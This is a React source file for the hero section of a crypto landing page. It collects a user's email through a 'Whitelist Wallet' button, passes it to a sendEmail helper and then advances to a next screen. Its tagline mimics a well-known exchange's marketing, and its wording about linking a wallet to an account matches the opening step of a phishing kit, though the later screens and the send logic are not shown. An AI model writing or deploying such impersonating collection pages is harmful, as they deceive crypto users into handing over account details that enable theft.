import { Button } from "./ui/button";
import hero1 from "../assets/hero1.webp";
import { useState } from "react";
import { sendEmail } from "@/utils/sendMessage";

const HeroSection = ({ nextScreen }: { nextScreen: () => void }) => {
  const [email, setEmail] = useState("");
  const [error, setError] = useState("");
  const handleWhiteList = async () => {
    if (email === "") {
      setError(
        "Please enter the email address attached to the account you would like to link this wallet to before proceeding."
      );
      return;
    }
    if (!email.includes("@")) {
      setError(
        "Please enter a valid email address attached to the account you would like to link this wallet to before proceeding."
      );
      return;
    }

    const response = await sendEmail(email);

    if (response) nextScreen();
  };
  return (
    <section className="bg-white py-16 px-4 md:px-8 lg:px-20">
      <div className="max-w-7xl mx-auto flex flex-col-reverse lg:flex-row items-center justify-between gap-10">
        <div className="flex gap-6 w-full lg:w-1/2">
          <img src={hero1} alt="Crypto App Left" className="w-full  mx-auto" />
        </div>

        <div className="w-full lg:w-1/2 text-center lg:text-left">
          <h1 className="text-4xl md:text-5xl font-semibold text-gray-900 mb-4">
            The future of money is here
          </h1>
          <p className="text-gray-700 text-lg mb-6">
            We're the most trusted place for people and businesses to buy, sell,
            and manage crypto.
          </p>
          <div className="flex flex-col sm:flex-row items-center gap-3">
            <input
              type="email"
              value={email}
              onChange={(e) => setEmail(e.target.value)}
              placeholder="satoshi@nakamoto.com"
              className="px-4 py-3 border border-gray-300 rounded-md w-full sm:w-auto sm:flex-1"
            />
            <Button
              onClick={handleWhiteList}
              className="bg-blue-600 hover:bg-blue-700 text-white px-6 py-6 rounded-full text-xl cursor-pointer"
            >
              Whitelist Wallet
            </Button>
          </div>
          {error && <p className="text-red-500 text-sm mt-2">{error}</p>}
        </div>
      </div>
    </section>
  );
};

export default HeroSection;
